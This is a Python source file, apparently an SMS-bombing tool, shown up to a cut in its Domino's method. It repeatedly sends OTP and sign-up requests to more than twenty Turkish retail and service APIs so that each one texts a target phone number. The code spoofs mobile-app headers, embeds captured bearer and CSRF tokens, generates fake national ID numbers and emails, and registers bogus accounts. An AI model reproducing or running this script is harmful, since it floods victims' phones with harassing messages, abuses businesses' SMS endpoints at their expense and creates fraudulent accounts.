import requests
from random import choice, randint
from string import ascii_lowercase
from colorama import Fore, Style
import uuid

class SendSms():
    adet = 0

    def __init__(self, phone, mail=""):
        digits = [randint(1, 9)] + [randint(0, 9) for _ in range(8)]
        digits.append(((digits[0] + digits[2] + digits[4] + digits[6] + digits[8]) * 7 - (digits[1] + digits[3] + digits[5] + digits[7])) % 10)
        digits.append(sum(digits[:10]) % 10)
        self.tc = ''.join(map(str, digits))

        self.phone = str(phone)

        if mail:
            self.mail = mail
        else:
            domain = choice(["gmail.com", "hotmail.com", "outlook.com", "yandex.com"])
            username = ''.join(choice(ascii_lowercase) for _ in range(13))
            self.mail = f"{username}@{domain}"


    #kahvedunyasi.com
    def KahveDunyasi(self):    
        try:    
            url = "https://api.kahvedunyasi.com:443/api/v1/auth/account/register/phone-number"
            headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:135.0) Gecko/20100101 Firefox/135.0", "Accept": "application/json, text/plain, */*", "Accept-Encoding": "gzip, deflate, br", "Content-Type": "application/json", "X-Language-Id": "tr-TR", "X-Client-Platform": "web", "Origin": "https://www.kahvedunyasi.com", "Dnt": "1", "Sec-Gpc": "1", "Referer": "https://www.kahvedunyasi.com/", "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "same-site", "Priority": "u=0", "Te": "trailers", "Connection": "keep-alive"}
            json={"countryCode": "90", "phoneNumber": self.phone}
            r = requests.post(url, headers=headers, json=json, timeout=6)
            if r.json()["processStatus"] == "Success":
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> api.kahvedunyasi.com")
                self.adet += 1
            else:
                raise
        except:    
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> api.kahvedunyasi.com")
        

    #wmf.com.tr
    def Wmf(self):
        try:
            wmf = requests.post("https://www.wmf.com.tr/users/register/", data={"confirm": "true", "date_of_birth": "1956-03-01", "email": self.mail, "email_allowed": "true", "first_name": "Memati", "gender": "male", "last_name": "Bas", "password": "31ABC..abc31", "phone": f"0{self.phone}"}, timeout=6)
            if wmf.status_code == 202:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> wmf.com.tr")
                self.adet += 1   
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> wmf.com.tr")
    
    
    #bim
    def Bim(self):
        try:
            bim = requests.post("https://bim.veesk.net:443/service/v1.0/account/login",  json={"phone": self.phone}, timeout=6)
            if bim.status_code == 200:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> bim.veesk.net")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> bim.veesk.net")


    #englishhome.com   
    def Englishhome(self):
        try:
            session = requests.Session()
            session.get("https://www.englishhome.com/", timeout=5)
            check_url = "https://www.englishhome.com/api/member/CheckUser"
            headers = {
                "User-Agent": "Mozilla/5.0",
                "Accept": "application/json, text/javascript, */*; q=0.01",
                "Content-Type": "application/json; charset=UTF-8",
                "Origin": "https://www.englishhome.com",
                "Referer": "https://www.englishhome.com/",
                "X-Requested-With": "XMLHttpRequest",
                "X-AjaxPro-Token": "R3gXxYrxVQuAB-u64ODyvkF7UWZ_vTmi4EInx4Vb32zVrBb_PL2P8FN5NtX24zlwem1lJ_lLX-ZqFB4OKF7AwRqjZek1"
            }
            check_data = {
                "phone": f"+90{self.phone}",
                "email": "",
                "smsType": 1
            }
            session.post(check_url, headers=headers, json=check_data, timeout=6)

            send_url = "https://www.englishhome.com/api/member/sendOtp"
            send_data = {
                "Phone": f"+90{self.phone}",
                "XID": ""
            }
            r2 = session.post(send_url, headers=headers, json=send_data, timeout=6)

            try:
                resp = r2.json()
            except ValueError:
                print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Geçersiz yanıt! {self.phone} --> englishhome.com\nYanıt: {r2.text}")
                return

            if resp.get("isError") is False:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> englishhome.com")
                self.adet += 1
            else:
                print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> englishhome.com | Hata: {resp.get('userMessage') or 'Bilinmeyen'}")

        except Exception as e:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}İstek hatası! {self.phone} --> englishhome.com | Hata: {e}")

            

    #suiste.com
    def Suiste(self):
        try:
            url = "https://suiste.com:443/api/auth/code"
            headers = {"Content-Type": "application/x-www-form-urlencoded; charset=utf-8", "X-Mobillium-Device-Brand": "Apple", "Accept": "application/json", "X-Mobillium-Os-Type": "iOS", "X-Mobillium-Device-Model": "iPhone", "Mobillium-Device-Id": "2390ED28-075E-465A-96DA-DFE8F84EB330", "Accept-Language": "en", "X-Mobillium-Device-Id": "2390ED28-075E-465A-96DA-DFE8F84EB330", "Accept-Encoding": "gzip, deflate, br", "X-Mobillium-App-Build-Number": "1469", "User-Agent": "suiste/1.7.11 (com.mobillium.suiste; build:1469; iOS 15.8.3) Alamofire/5.9.1", "X-Mobillium-Os-Version": "15.8.3", "X-Mobillium-App-Version": "1.7.11"}
            data = {"action": "register", "device_id": "2390ED28-075E-465A-96DA-DFE8F84EB330", "full_name": "Memati Bas", "gsm": self.phone, "is_advertisement": "1", "is_contract": "1", "password": "31MeMaTi31"}
            r = requests.post(url, headers=headers, data=data, timeout=6)
            if r.json()["code"] == "common.success":
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> suiste.com")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> suiste.com")
                
    
    #KimGbIster
    def KimGb(self):
        try:
            r = requests.post("https://3uptzlakwi.execute-api.eu-west-1.amazonaws.com:443/api/auth/send-otp", json={"msisdn": f"90{self.phone}"}, timeout=6)
            if r.status_code == 200:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> 3uptzlakwi.execute-api.eu-west-1.amazonaws.com")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> 3uptzlakwi.execute-api.eu-west-1.amazonaws.com")
            
    
    #evidea.com
    def Evidea(self):
        try:
            url = "https://www.evidea.com:443/users/register/"
            headers = {"Content-Type": "multipart/form-data; boundary=fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi", "X-Project-Name": "undefined", "Accept": "application/json, text/plain, */*", "X-App-Type": "akinon-mobile", "X-Requested-With": "XMLHttpRequest", "Accept-Language": "tr-TR,tr;q=0.9", "Cache-Control": "no-store", "Accept-Encoding": "gzip, deflate", "X-App-Device": "ios", "Referer": "https://www.evidea.com/", "User-Agent": "Evidea/1 CFNetwork/1335.0.3 Darwin/21.6.0", "X-Csrftoken": "7NdJbWSYnOdm70YVLIyzmylZwWbqLFbtsrcCQdLAEbnx7a5Tq4njjS3gEElZxYps"}
            data = f"--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"first_name\"\r\n\r\nMemati\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"last_name\"\r\n\r\nBas\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"email\"\r\n\r\n{self.mail}\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"email_allowed\"\r\n\r\nfalse\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"sms_allowed\"\r\n\r\ntrue\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"password\"\r\n\r\n31ABC..abc31\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"phone\"\r\n\r\n0{self.phone}\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"confirm\"\r\n\r\ntrue\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi--\r\n"
            r = requests.post(url, headers=headers, data=data, timeout=6)      
            if r.status_code == 202:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> evidea.com")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> evidea.com") 


    #345dijital.com
    def Ucdortbes(self):
        try:
            url = "https://api.345dijital.com:443/api/users/register"
            headers = {"Accept": "application/json, text/plain, */*", "Content-Type": "application/json", "Accept-Encoding": "gzip, deflate", "User-Agent": "AriPlusMobile/21 CFNetwork/1335.0.3.2 Darwin/21.6.0", "Accept-Language": "en-US,en;q=0.9", "Authorization": "null", "Connection": "close"}
            json={"email": "", "name": "Memati", "phoneNumber": f"+90{self.phone}", "surname": "Bas"}
            r = requests.post(url, headers=headers, json=json, timeout=6)
            if r.json()["error"] == "E-Posta veya telefon zaten kayıtlı!":
                print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> api.345dijital.com")
            else:
                raise
        except:
            print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> api.345dijital.com")
            self.adet += 1

    def TiklaGelsin(self):
        try:
            url = "https://svc.apps.tiklagelsin.com:443/user/graphql"
            headers = {
                "Content-Type": "application/json",
                "X-Merchant-Type": "0",
                "Accept": "*/*",
                "Accept-Language": "tr-TR",
                "Accept-Encoding": "gzip, deflate, br",
                "X-No-Auth": "true",
                "User-Agent": "Mozilla/5.0",
                "X-Device-Type": "3"
            }
            json_data = {
                "operationName": "GENERATE_OTP",
                "query": """
                    mutation GENERATE_OTP($phone: String, $challenge: String, $deviceUniqueId: String) {
                        generateOtp(phone: $phone, challenge: $challenge, deviceUniqueId: $deviceUniqueId)
                    }
                """,
                "variables": {
                    "phone": f"+90{self.phone}",
                    "challenge": str(uuid.uuid4()),
                    "deviceUniqueId": str(uuid.uuid4())
                }
            }

            r = requests.post(url, headers=headers, json=json_data, timeout=6)
            if r.status_code == 200 and r.json().get("data", {}).get("generateOtp") is True:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> tiklagelsin.com")
                self.adet += 1
            else:
                raise Exception(f"Yanıt: {r.text}")
        except Exception as e:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> tiklagelsin.com | Hata: {e}")

    def TavukDunyasiSMS(self):
        try:
            url = "https://onlinesiparis-api.tavukdunyasi.com/api/InternalAuth/InternalRegister"
            headers = {
                "Content-Type": "application/json",
                "Origin": "https://onlinesiparis.tavukdunyasi.com",
                "Referer": "https://onlinesiparis.tavukdunyasi.com/",
                "User-Agent": "Mozilla/5.0",
                "x-culture": "tr"
            }

            payload = {
                "email": self.mail,
                "password": "Test1234!",
                "rePassword": "Test1234!", 
                "name": "Test",          
                "surname": "User",         
                "countryCode": "90",     
                "phoneNumber": self.phone,
                "birthDate": "1990-01-01",
                "gender": 1,
                "isKvkkApproved": True,
                "isCampaignApproved": True,
                "isMembershipContractApproved": True,
                "isEInvoiceApproved": True,
                "isETicketApproved": True,
                "isUserAgreementApproved": True,        
                "isCommercialElectronicMessageApproved": True  
            }

            response = requests.post(url, headers=headers, json=payload, timeout=10)

            if response.status_code == 200:
                print(f"[+] Başarılı! {self.phone} --> tavukdunyasi.com")
                self.adet += 1
            else:
                print(f"[-] Başarısız! {self.phone} --> tavukdunyasi.com | Hata: {response.text}")
        except Exception as e:
            print(f"[-] Başarısız! {self.phone} --> tavukdunyasi.com | Hata: {e}")


    #naosstars.com
    def Naosstars(self):
        try:
            url = "https://naosstars.com/api/smsSend/9f98c84b-25a4-4075-87db-16ce04e27310"
            headers = {
                "User-Agent": "Mozilla/5.0",
                "Content-Type": "application/json",
                "Accept": "application/json"
            }
            json_data = {
                "telephone": f"+90{self.phone}",
                "type": "register"
            }

            r = requests.post(url, headers=headers, json=json_data, timeout=6)
            if r.status_code == 200:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> naosstars.com")
                self.adet += 1
            else:
                raise Exception(f"Yanıt Kodu: {r.status_code}")
        except Exception as e:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> naosstars.com | Hata: {e}")


    #koton.com
    def Koton(self):
        try:
            url = "https://www.koton.com:443/users/register/"
            headers = {"Content-Type": "multipart/form-data; boundary=sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk", "X-Project-Name": "rn-env", "Accept": "application/json, text/plain, */*", "X-App-Type": "akinon-mobile", "X-Requested-With": "XMLHttpRequest", "Accept-Language": "en-US,en;q=0.9", "Cache-Control": "no-store", "Accept-Encoding": "gzip, deflate", "X-App-Device": "ios", "Referer": "https://www.koton.com/", "User-Agent": "Koton/1 CFNetwork/1335.0.3.2 Darwin/21.6.0", "X-Csrftoken": "5DDwCmziQhjSP9iGhYE956HHw7wGbEhk5kef26XMFwhELJAWeaPK3A3vufxzuWcz"}
            data = f"--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\ncontent-disposition: form-data; name=\"first_name\"\r\n\r\nMemati\r\n--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\ncontent-disposition: form-data; name=\"last_name\"\r\n\r\nBas\r\n--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\ncontent-disposition: form-data; name=\"email\"\r\n\r\n{self.mail}\r\n--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\ncontent-disposition: form-data; name=\"password\"\r\n\r\n31ABC..abc31\r\n--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\ncontent-disposition: form-data; name=\"phone\"\r\n\r\n0{self.phone}\r\n--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\ncontent-disposition: form-data; name=\"confirm\"\r\n\r\ntrue\r\n--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\ncontent-disposition: form-data; name=\"sms_allowed\"\r\n\r\ntrue\r\n--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\ncontent-disposition: form-data; name=\"email_allowed\"\r\n\r\ntrue\r\n--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\ncontent-disposition: form-data; name=\"date_of_birth\"\r\n\r\n1993-07-02\r\n--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\ncontent-disposition: form-data; name=\"call_allowed\"\r\n\r\ntrue\r\n--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\ncontent-disposition: form-data; name=\"gender\"\r\n\r\n\r\n--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk--\r\n"
            r = requests.post(url, headers=headers, data=data, timeout=6)
            if r.status_code == 202:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> koton.com")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> koton.com")


    #hayatsu.com.tr
    def Hayatsu(self):
        try:
            url = "https://api.hayatsu.com.tr:443/api/SignUp/SendOtp"
            headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0", "Accept": "application/json, text/javascript, */*; q=0.01", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate, br", "Referer": "https://www.hayatsu.com.tr/", "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "Authorization": "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJqdGkiOiJhMTA5MWQ1ZS0wYjg3LTRjYWQtOWIxZi0yNTllMDI1MjY0MmMiLCJsb2dpbmRhdGUiOiIxOS4wMS4yMDI0IDIyOjU3OjM3Iiwibm90dXNlciI6InRydWUiLCJwaG9uZU51bWJlciI6IiIsImV4cCI6MTcyMTI0NjI1NywiaXNzIjoiaHR0cHM6Ly9oYXlhdHN1LmNvbS50ciIsImF1ZCI6Imh0dHBzOi8vaGF5YXRzdS5jb20udHIifQ.Cip4hOxGPVz7R2eBPbq95k6EoICTnPLW9o2eDY6qKMM", "Origin": "https://www.hayatsu.com.tr", "Dnt": "1", "Sec-Gpc": "1", "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "same-site", "Te": "trailers"}
            data = {"mobilePhoneNumber": self.phone, "actionType": "register"}
            r = requests.post(url, headers=headers, data=data, timeout=6)
            if r.json()["is_success"] == True:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> api.hayatsu.com.tr")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> api.hayatsu.com.tr")


    #metro-tr.com
    def Metro(self):
        try:
            url = "https://mobile.metro-tr.com:443/api/mobileAuth/validateSmsSend"
            headers = {"Accept": "*/*", "Content-Type": "application/json; charset=utf-8", "Accept-Encoding": "gzip, deflate, br", "Applicationversion": "2.4.1", "Applicationplatform": "2", "User-Agent": "Metro Turkiye/2.4.1 (com.mcctr.mobileapplication; build:4; iOS 15.8.3) Alamofire/4.9.1", "Accept-Language": "en-BA;q=1.0, tr-BA;q=0.9, bs-BA;q=0.8", "Connection": "keep-alive"}
            json={"methodType": "2", "mobilePhoneNumber": self.phone}
            r = requests.post(url, headers=headers, json=json, timeout=6)
            if r.json()["status"] == "success":
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> mobile.metro-tr.com")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> mobile.metro-tr.com")


    #file.com.tr
    def File(self):
        try:
            url = "https://api.filemarket.com.tr:443/v1/otp/send"
            headers = {"Accept": "*/*", "Content-Type": "application/json", "User-Agent": "filemarket/2022060120013 CFNetwork/1335.0.3.2 Darwin/21.6.0", "X-Os": "IOS", "X-Version": "1.7", "Accept-Language": "en-US,en;q=0.9", "Accept-Encoding": "gzip, deflate"}
            json={"mobilePhoneNumber": f"90{self.phone}"}
            r = requests.post(url, headers=headers, json=json, timeout=6)
            if r.json()["responseType"] == "SUCCESS":
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> api.filemarket.com.tr")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> api.filemarket.com.tr")
            
    #sendpulse   
    def SendPulse(self):
        try:
            url = "https://login.sendpulse.com:443/api/v1/verification/phone"
            headers = {
                "User-Agent": "Mozilla/5.0",
                "Accept": "application/json, text/plain, */*",
                "Content-Type": "application/json;charset=UTF-8",
                "Origin": "https://sendpulse.com",
                "Referer": "https://sendpulse.com/tr/register",
            }

            json_data = {
                "phone": self.phone,  
                "purpose": "signup"   
            }

            r = requests.post(url, headers=headers, json=json_data, timeout=6)

            if r.status_code == 200 and r.json().get("status") == "ok":
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> sendpulse.com")
                self.adet += 1
            else:
                raise Exception(f"Gelen yanıt: {r.text}")
        except Exception as e:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> sendpulse.com | Hata: {e}")

    #komagene.com.tr
    def Komagene(self):
        try:
            url = "https://gateway.komagene.com.tr:443/auth/auth/smskodugonder"
            json={"FirmaId": 32, "Telefon": self.phone}
            headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:135.0) Gecko/20100101 Firefox/135.0", "Accept": "*/*", "Accept-Encoding": "gzip, deflate, br", "Referer": "https://www.komagene.com.tr/", "Anonymousclientid": "0dbf392b-ab10-48b3-5cda-31f3c19816e6", "Firmaid": "32", "X-Guatamala-Kirsallari": "@@b7c5EAAAACwZI8p8fLJ8p6nOq9kTLL+0GQ1wCB4VzTQSq0sekKeEdAoQGZZo+7fQw+IYp38V0I/4JUhQQvrq1NPw4mHZm68xgkb/rmJ3y67lFK/uc+uq", "Content-Type": "application/json", "Origin": "https://www.komagene.com.tr", "Dnt": "1", "Sec-Gpc": "1", "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "same-site", "Priority": "u=0", "Te": "trailers", "Connection": "keep-alive"}
            r = requests.post(url=url, headers=headers, json=json, timeout=6)
            if r.json()["Success"] == True:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> gateway.komagene.com")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> gateway.komagene.com")
    
    
    #porty.tech
    def Porty(self):
        try:
            url = "https://panel.porty.tech:443/api.php?"
            headers = {"Accept": "*/*", "Content-Type": "application/json; charset=UTF-8", "Accept-Encoding": "gzip, deflate", "Accept-Language": "en-US,en;q=0.9", "User-Agent": "Porty/1 CFNetwork/1335.0.3.4 Darwin/21.6.0", "Token": "q2zS6kX7WYFRwVYArDdM66x72dR6hnZASZ"}
            json={"job": "start_login", "phone": self.phone}
            r = requests.post(url=url, json=json, headers=headers, timeout=6)
            if r.json()["status"]== "success":
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> panel.porty.tech")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> panel.porty.tech")
    
    
    #vakiftasdelensu.com
    def Tasdelen(self):
        try:
            url = "https://tasdelen.sufirmam.com:3300/mobile/send-otp"
            headers = {"Accept": "*/*", "Content-Type": "application/json", "Accept-Encoding": "gzip, deflate, br", "User-Agent": "Tasdelen/5.9 (com.tasdelenapp; build:1; iOS 15.8.3) Alamofire/5.4.3", "Accept-Language": "en-BA;q=1.0, tr-BA;q=0.9, bs-BA;q=0.8", "Connection": "keep-alive"}
            json={"phone": self.phone}
            r = requests.post(url=url, headers=headers, json=json, timeout=6)
            if r.json()["result"]== True:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> tasdelen.sufirmam.com")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> tasdelen.sufirmam.com")
    

    #uysalmarket.com.tr
    def Uysal(self):
        try:
            url = "https://api.uysalmarket.com.tr/api/mobile-users/send-register-sms"
            headers = {
                "User-Agent": "Mozilla/5.0",
                "Accept": "application/json, text/plain, */*",
                "Accept-Encoding": "gzip, deflate, br",
                "Content-Type": "application/json;charset=utf-8",
                "Origin": "https://www.uysalmarket.com.tr",
                "Referer": "https://www.uysalmarket.com.tr/",
                "Sec-Fetch-Dest": "empty",
                "Sec-Fetch-Mode": "cors",
                "Sec-Fetch-Site": "same-site",
            }
            json_data = {"phone_number": self.phone}  
            r = requests.post(url, headers=headers, json=json_data, timeout=6)

            if r.status_code == 200 and r.json().get("success", True):
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> api.uysalmarket.com.tr")
                self.adet += 1
            else:
                raise Exception(f"Gelen yanıt: {r.text}")
        except Exception as e:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> api.uysalmarket.com.tr | Hata: {e}")
        
    
    #yapp.com.tr
    def Yapp(self):
        try:
            url = "https://yapp.com.tr:443/api/mobile/v1/register"
            headers = {"Accept": "application/json", "Content-Type": "application/json", "X-Content-Language": "en", "Accept-Language": "en-BA;q=1, tr-BA;q=0.9, bs-BA;q=0.8", "Authorization": "Bearer ", "User-Agent": "YappApp/1.1.5 (iPhone; iOS 15.8.3; Scale/3.00)", "Accept-Encoding": "gzip, deflate, br"}
            json={"app_version": "1.1.5", "code": "tr", "device_model": "iPhone8,5", "device_name": "Memati", "device_type": "I", "device_version": "15.8.3", "email": self.mail, "firstname": "Memati", "is_allow_to_communication": "1", "language_id": "2", "lastname": "Bas", "phone_number": self.phone, "sms_code": ""}
            r = requests.post(url=url, json=json, headers=headers, timeout=6)
            if r.status_code == 200:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> yapp.com.tr")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> yapp.com.tr")
    

    #beefull.com
    def  Beefull(self):
        try:
            url = "https://app.beefull.io:443/api/inavitas-access-management/signup"
            json={"email": self.mail, "firstName": "Memati", "language": "tr", "lastName": "Bas", "password": "123456", "phoneCode": "90", "phoneNumber": self.phone, "tenant": "beefull", "username": self.mail}
            requests.post(url, json=json, timeout=4)
            url = "https://app.beefull.io:443/api/inavitas-access-management/sms-login"
            json={"phoneCode": "90", "phoneNumber": self.phone, "tenant": "beefull"}
            r = requests.post(url, json=json, timeout=4)
            if r.status_code == 200:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> app.beefull.io")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> app.beefull.io")


    #dominos.com.tr
    def Dominos(self):
        try:
            url = "https://frontend.dominos.com.tr:443/api/customer/sendOtpCode"
            headers = {"Content-Type": "application/json;charset=utf-8", "Accept": "application/json, text/plain, */*", "Authorization": "Bearer eyJhbGciOiJBMTI4S1ciLCJlbmMiOiJBMTI4Q0JDLUhTMjU2IiwidHlwIjoiSldUIn0.ITty2sZk16QOidAMYg4eRqmlBxdJhBhueRLSGgSvcN3wj4IYX11FBA.N3uXdJFQ8IAFTnxGKOotRA.7yf_jrCVfl-MDGJjxjo3M8SxVkatvrPnTBsXC5SBe30x8edSBpn1oQ5cQeHnu7p0ccgUBbfcKlYGVgeOU3sLDxj1yVLE_e2bKGyCGKoIv-1VWKRhOOpT_2NJ-BtqJVVoVnoQsN95B6OLTtJBlqYAFvnq6NiQCpZ4o1OGNhep1TNSHnlUU6CdIIKWwaHIkHl8AL1scgRHF88xiforpBVSAmVVSAUoIv8PLWmp3OWMLrl5jGln0MPAlST0OP9Q964ocXYRfAvMhEwstDTQB64cVuvVgC1D52h48eihVhqNArU6-LGK6VNriCmofXpoDRPbctYs7V4MQdldENTrmVcMVUQtZJD-5Ev1PmcYr858ClLTA7YdJ1C6okphuDasvDufxmXSeUqA50-nghH4M8ofAi6HJlpK_P0x_upqAJ6nvZG2xjmJt4Pz_J5Kx_tZu6eLoUKzZPU3k2kJ4KsqaKRfT4ATTEH0k15OtOVH7po8lNwUVuEFNnEhpaiibBckipJodTMO8AwC4eZkuhjeffmf9A.QLpMS6EUu7YQPZm1xvjuXg", "Device-Info": "Unique-Info: 2BF5C76D-0759-4763-C337-716E8B72D07B Model: iPhone 31 Plus Brand-Info: Apple Build-Number: 7.1.0 SystemVersion: 15.8", "Appversion": "IOS-7.1.0", "Accept-Encoding": "gzip, deflate, br", "Accept-Language": "tr-TR,tr;q=0.9", "User-Agent": "Dominos/7.1.0 CFNetwork/1335.0.3.4 Darwin/21.6.0", "Servicetype": "CarryOut", "Locationcode": "undefined"}
